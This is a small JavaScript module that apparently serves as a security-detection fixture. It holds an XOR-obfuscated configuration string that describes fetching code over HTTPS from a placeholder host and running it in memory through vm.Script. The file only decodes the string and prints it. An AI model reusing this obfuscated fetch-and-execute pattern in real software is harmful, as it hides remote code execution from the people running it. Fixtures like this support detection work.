  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_5b715143 = "\\xd4\\x9f\\x93\\xde\\xd1\\xd6\\xc7\\xd2\\xd1\\x9f\\xc3\\xc1\\xd3\\xd7\\xcb\\xd0\\xc7\\xfd\\xd0\\xc7\\xcf\\xcd\\xd6\\xc7\\x8e\\xc6\\xcb\\xd1\\xd2\\xc3\\xd6\\xc1\\xca\\xfd\\xcf\\xc7\\xcf\\xcd\\xd0\\xdb\\xde\\xc3\\xc6\\xc3\\xd2\\xd6\\xc7\\xd0\\x9f\\xca\\xd6\\xd6\\xd2\\xd1\\xfd\\xd6\\xca\\xc7\\xcc\\xfd\\xd4\\xcf\\xde\\xd1\\xd6\\xc3\\xc5\\xc7\\xfd\\xc1\\xcd\\xd7\\xcc\\xd6\\x9f\\x93\\xde\\xc1\\xc3\\xcf\\xd2\\xc3\\xcb\\xc5\\xcc\\xfd\\xcb\\xc6\\x9f\\xec\\xed\\xe6\\xe7\\x8f\\xe6\\xe1\\x91\\xe6\\x91\\xe3\\xe0\\x90\\xde\\xd7\\xd0\\xce\\x9f\\xca\\xd6\\xd6\\xd2\\xd1\\x98\\x8d\\x8d\\xcc\\xcd\\xc6\\xc7\\x8f\\xc6\\xc1\\x91\\xc6\\x91\\xc3\\xc0\\x90\\xc3\\x9b\\xc7\\x93\\x8c\\xc7\\xda\\xc3\\xcf\\xd2\\xce\\xc7\\x8c\\xcb\\xcc\\xd4\\xc3\\xce\\xcb\\xc6\\x8d\\xc3\\xd2\\xcb\\xde\\xd7\\xd1\\xc7\\xd0\\xfd\\xc3\\xc5\\xc7\\xcc\\xd6\\x9f\\xec\\xcd\\xc6\\xc7\\xe3\\xd7\\xc6\\xcb\\xd6\\x8d\\xc6\\xc1\\x91\\xc6";
  const Codec_5b715143 = "escaped_octets|single_byte_xor|a2";

  function load_5b715143() { return [...Material_5b715143.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_5b715143(v_a19c) { return v_a19c.map((value) => value ^ 162); }
  async function recover_5b715143() {
    const v_c304 = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
    const v_a19c = load_5b715143(); let v_b27e = [];
    v_b27e = decode_5b715143(v_a19c);
    void v_c304; return Buffer.from(v_b27e).toString("ascii");
  }
  async function inspect_5b715143() { return Buffer.from(await recover_5b715143(), "utf8").toString("utf8"); }
  async function plan_5b715143() { const inspect = inspect_5b715143; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "https_then_vm", url: fields.url, dispatch: "vm.Script" }); }
  void moduleShape; void plan_5b715143;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_5b715143());
